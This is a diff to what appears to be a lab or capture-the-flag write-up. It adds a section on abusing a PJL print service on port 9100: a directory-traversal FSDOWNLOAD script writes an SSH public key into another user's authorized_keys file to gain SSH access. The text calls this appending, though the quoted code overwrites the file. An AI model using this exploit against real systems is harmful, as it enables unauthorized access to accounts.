@@ -325,12 +325,14 @@ The printer-like service on port `9100` was the most interesting target.
 The target did not have `nc`, so I used Python sockets.
 
 ```python
+python3 - <<'PY'
 import socket
 
 s = socket.create_connection(("127.0.0.1", 9100), timeout=3)
 s.sendall(b"@PJL INFO ID\r\n")
 print(s.recv(4096).decode(errors="replace"))
 s.close()
+PY
 ```
 
 Response:
@@ -465,6 +467,64 @@ Because the same vulnerable path translation was used, directory traversal could
 
 # 13. SSH Key Injection
 
+After discovering /home/archivist/.ssh/authorized_keys, I used the PJL filesystem write functionality to add my own SSH public key to the file.
+
+The jetdirect.py source showed that the FSDOWNLOAD command writes attacker-controlled data to an arbitrary filesystem path:
+
+def write(self, path, data):
+    target = self._translate(path)
+    try:
+        os.makedirs(os.path.dirname(target), exist_ok=True)
+        with open(target, "wb") as f:
+            f.write(data)
+        return "OK"
+    except:
+        return "FILEERROR=1"
+
+Because the path translation did not prevent directory traversal, I could target:
+
+/home/archivist/.ssh/authorized_keys
+
+I used the following Python script from the lp shell:
+
+```python
+python3 - <<'PY'
+import socket
+
+path = "0:/../../../home/archivist/.ssh/authorized_keys"
+pubkey = b"yoursshkey\n"
+
+s = socket.create_connection(("127.0.0.1", 9100), timeout=3)
+
+header = f'@PJL FSDOWNLOAD NAME="{path}" SIZE={len(pubkey)}\r\n'.encode()
+
+s.sendall(header)
+s.sendall(pubkey)
+
+print(s.recv(4096).decode(errors="replace"))
+
+s.close()
+PY
+```
+
+The important part is:
+
+@PJL FSDOWNLOAD
+
+Unlike FSUPLOAD, which reads a file, FSDOWNLOAD causes the server to write the supplied data to the specified path.
+
+The traversal path:
+
+0:/../../../home/archivist/.ssh/authorized_keys
+
+was resolved by the vulnerable path handling to:
+
+/home/archivist/.ssh/authorized_keys
+
+This allowed me to append my SSH public key to archivist's authorized_keys file.
+
+After the key was written, I could authenticate to the target as archivist using the corresponding private key.
+
 On Kali I generated a fresh Ed25519 key pair:
 
 ```bash
@@ -495,7 +555,7 @@ I then verified the file through PJL and confirmed that the public key had been 
 
 # 14. SSH as Archivist
 
-Using the corresponding private key:
+Using the corresponding private key on our kali terminal:
 
 ```bash
 ssh -i ~/paperwork_key archivist@10.129.106.36
